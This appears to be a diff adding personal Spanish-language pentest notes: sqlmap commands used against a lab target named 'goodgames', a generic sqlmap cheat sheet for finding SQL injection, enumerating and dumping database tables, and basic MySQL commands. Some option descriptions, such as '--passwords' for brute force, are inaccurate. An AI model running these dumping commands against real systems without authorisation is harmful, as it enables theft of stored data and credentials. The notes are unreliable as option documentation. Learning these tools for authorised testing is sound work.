@@ -1,0 +1,77 @@
+sqlmap:
+parámetros:
+leer archivo de burpsuite: -r
+leer base de datos: -dbs:
+
+sintaxis 
+sqlmap -r goodgames -dbs
+sqlmap -r goodgames -D main -T user --dump-all
+
+comandos mysql
+mysql
+show databases;
+use nombre de la base de datos;
+
+tablas 
+show tables; 
+use 
+
+SELECT * FROM
+
+SQLMAP Cheat Sheet
+=========================
+
+1. Escanear una URL en busca de vulnerabilidades de inyección SQL:
+   sqlmap -u <URL>
+
+2. Especificar un parámetro vulnerable:
+   sqlmap -u <URL> --data "param1=value1&param2=value2" -p <parámetro>
+
+3. Escanear una URL que requiere autenticación:
+   sqlmap -u <URL> --auth-type <tipo_autenticación> --auth-cred "<usuario>:<contraseña>"
+
+4. Obtener información básica de la base de datos:
+   sqlmap -u <URL> --dbs
+
+5. Enumerar las tablas de una base de datos:
+   sqlmap -u <URL> -D <nombre_base_de_datos> --tables
+
+6. Enumerar columnas de una tabla específica:
+   sqlmap -u <URL> -D <nombre_base_de_datos> -T <nombre_tabla> --columns
+
+7. Extraer datos de una tabla:
+
+   sqlmap -u <URL> -D <nombre_base_de_datos> -T <nombre_tabla> -C <columnas> --dump
+
+8. Realizar un ataque de fuerza bruta a credenciales:
+   sqlmap -u <URL> --data "param1=value1&param2=value2" --method <método> --user-agent "<user_agent>" --passwords <ruta_archivo>
+
+9. Escanear y explotar una inyección SQL:
+   sqlmap -u <URL> --data "param1=value1&param2=value2" --batch --risk <nivel_riesgo> --level <nivel_inyección>
+
+10. Ver la ayuda y opciones avanzadas:
+    sqlmap -h
+
+Opciones adicionales:
+---------------------
+- Configurar el tiempo de espera entre solicitudes:
+  sqlmap -u <URL> --timeout <segundos>
+
+- Personalizar el encabezado HTTP:
+  sqlmap -u <URL> --headers "<encabezado>"
+
+- Especificar el uso de un proxy:
+  sqlmap -u <URL> --proxy "<proxy>"
+
+- Utilizar un archivo de configuración personalizado:
+  sqlmap -c "<ruta_archivo>"
+
+- Guardar los resultados en un archivo de registro:
+  sqlmap -u <URL> --output-file <ruta_archivo>
+
+
+mysql -u root -p
+show databases
+use db
+show tables 
+SELECT nombre_columna FROM nombre_tabla;
